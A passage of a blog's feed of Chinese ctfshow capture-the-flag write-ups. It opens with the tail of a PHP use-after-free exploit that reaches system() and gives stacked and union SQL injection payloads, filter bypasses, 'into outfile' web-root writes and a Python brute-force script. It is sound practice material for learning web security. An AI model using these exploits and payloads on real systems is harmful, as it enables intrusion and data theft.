class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">命令执行刷题</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow刷题,9-8</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/f7bb10d8.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/f7bb10d8.html</id>
    <published>2024-09-08T01:36:00.000Z</published>
    <updated>2024-09-08T03:04:01.629Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="开刷"><a href="#开刷" class="headerlink" title="开刷"></a>开刷</h3><p><strong>web195</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>堆叠注入最大的提示就是没过滤分号;</code></p><p>直接把密码改了,<code>0;update</code>ctfshow_user<code>set</code>pass<code>=0</code></p><p>双击登录即可成功!</p><blockquote><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有过滤的数字型注入，给出的过滤正则表达式变得不可信，明明有 select 但还是可以用的，利用堆叠注入绕过密码。<br>payload: <code>1;select(1)</code> 密码 1</p><blockquote><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">这是后端的返回逻辑</span><br></pre></td></tr></table></figure><p><code>还是只要登录成功就可获得flag</code>,这里可以对表的结构进行修改,要么将字段名互换,要么添加新用户都是可以的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, Back, Style</span><br><span class="line"><span class="comment"># 换字段名,再爆破</span></span><br><span class="line"><span class="comment"># 初始化 colorama</span></span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5fc3792d-7987-4020-bd67-439f5125d14c.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_table</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0;alter table ctfshow_user change column pass tmp varchar(255);alter table ctfshow_user change &quot;</span></span><br><span class="line">                    <span class="string">&quot;column id pass varchar(255);alter table ctfshow_user change column tmp id varchar(255)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    _ = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_admin</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: &#123;i&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED+<span class="string">f&quot;[!] password: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(Fore.GREEN+<span class="string">f&quot;[*] msg: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] change column id to pass&quot;</span>)</span><br><span class="line">    alter_table()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] brute force admin password&quot;</span>)</span><br><span class="line">    brute_force_admin()</span><br></pre></td></tr></table></figure><ol><li><p>添加新用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; insert ctfshow_user(`username`,`pass`) value(1,2)</span></span><br></pre></td></tr></table></figure></li><li><p>构造满足要求的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: <span class="number">1</span>;<span class="keyword">show</span> tables</span><br><span class="line">pass: ctfshow_user</span><br></pre></td></tr></table></figure></li></ol><blockquote><p><strong>199</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过滤了<code>(</code>,无法用<code>varchar(255)</code></strong>,我们选择用<code>text</code>平替一下即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> pass tmp <span class="type">varchar</span>(<span class="number">255</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change &quot;</span><br><span class="line">                    &quot;<span class="keyword">column</span> id pass <span class="type">varchar</span>(<span class="number">255</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> tmp id <span class="type">varchar</span>(<span class="number">255</span>)</span><br></pre></td></tr></table></figure><hr><blockquote><h3 id="堆叠注入结束了喔"><a href="#堆叠注入结束了喔" class="headerlink" title="堆叠注入结束了喔!"></a>堆叠注入结束了喔!</h3></blockquote>]]></content>
    
    
    <summary type="html">堆叠注入</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow刷题,9-3</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/6069c950.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/6069c950.html</id>
    <published>2024-09-03T09:28:00.000Z</published>
    <updated>2024-09-08T01:37:40.996Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">又来刷题了</span><br><span class="line">ctfshow的题目还是很全的,之前刷题都不是很系统,这次再努力一次吧!</span><br><span class="line">参考:https://hextuff.dev/2021/07/29/ctfshow-web-getting-started-sql-injection/#web188</span><br></pre></td></tr></table></figure><blockquote><h3 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h3><p><strong>web 174(sql注入)</strong></p></blockquote><p>查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>结果返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="string">&#x27;union select 1,1--+ #这个是不能直接查询,过不了正则,即查询的结果不能含有flag和数字,那这样即使是查到flag也无法输出结果,因此我们要进行base64编码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="type">CHAR</span>(<span class="number">100</span>),<span class="type">CHAR</span>(<span class="number">100</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>sqlmap给出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">994</span>c4e0c<span class="operator">-</span>b284<span class="number">-461e-9612</span><span class="operator">-</span>c6ef5eaa512a.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>v4.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7178717671,0x6c734e546e4571636d5443754641574f41426d6b43644745744a6976654149746f76647059774676,0x7171707071)-- -&amp;page=1&amp;limit=10</span></span><br></pre></td></tr></table></figure><p>手动注入:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库表名</span><br><span class="line"><span class="number">0</span><span class="string">&#x27; union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 直接查flag</span></span><br><span class="line"><span class="string">0&#x27;</span> <span class="keyword">union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(password) <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;flag&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202409040852358.png" alt="image-20240904085215228"></p><blockquote><p><strong>175(sql注入全过滤)</strong></p></blockquote><ul><li><p>时间盲注写脚本</p></li><li><p>将结果以文件形式输出(当存在可写入权限时是一种通杀方法)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>txt<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p><strong>181</strong></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, $str);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> 解题:</span><br><span class="line"> <span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--%0c #万能密码,闭合永真式查出所有数据</span></span><br><span class="line"><span class="string"> &#x27;</span><span class="keyword">or</span>(username)<span class="operator">=</span><span class="string">&#x27;flag #类似上面思路,不过闭合后得到username=flag</span></span><br><span class="line"><span class="string"> -1&#x27;</span><span class="operator">%</span><span class="number">0</span>cor<span class="operator">%</span><span class="number">0</span>cusername<span class="operator">%</span><span class="number">0</span>clike<span class="operator">%</span><span class="number">0</span>c<span class="string">&#x27;flag #like关键字的使用,若=号被过滤</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>182</strong>,过滤flag关键字</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, $str);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  解题</span><br><span class="line">  <span class="number">1.</span>万能密码 <span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--%0c 或者 1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="comment">--%01 #注意闭合方式和手法</span></span><br><span class="line">  <span class="number">2.</span><span class="keyword">like</span>模糊查询绕过flag <span class="string">&#x27;or`username`like&#x27;</span>f<span class="operator">%</span>  或者 <span class="number">999</span><span class="string">&#x27;||`username`like&#x27;</span>f<span class="operator">%</span></span><br><span class="line">  <span class="number">3.</span>concat拼接绕过flag  <span class="number">-1</span><span class="string">&#x27;or(username=concat(&#x27;</span>fl<span class="string">&#x27;,&#x27;</span>ag<span class="string">&#x27;))and&#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><code>tips</code>:这里给出万能密码拼接出的sql语句.方便分析</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;-1&#x27;</span><span class="keyword">or</span>(username<span class="operator">=</span>concat(<span class="string">&#x27;fl&#x27;</span>,<span class="string">&#x27;ag&#x27;</span>))<span class="keyword">and</span><span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><strong>从左往右看的话就好理解了,前面两个and可以看作一个,因为默认顺序,然后or后面的and都是永真,因此整个where判断条件都是永真!即可查询所有密码</strong></p><blockquote><p><strong>183</strong> ,or  and flag 关键字都被过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  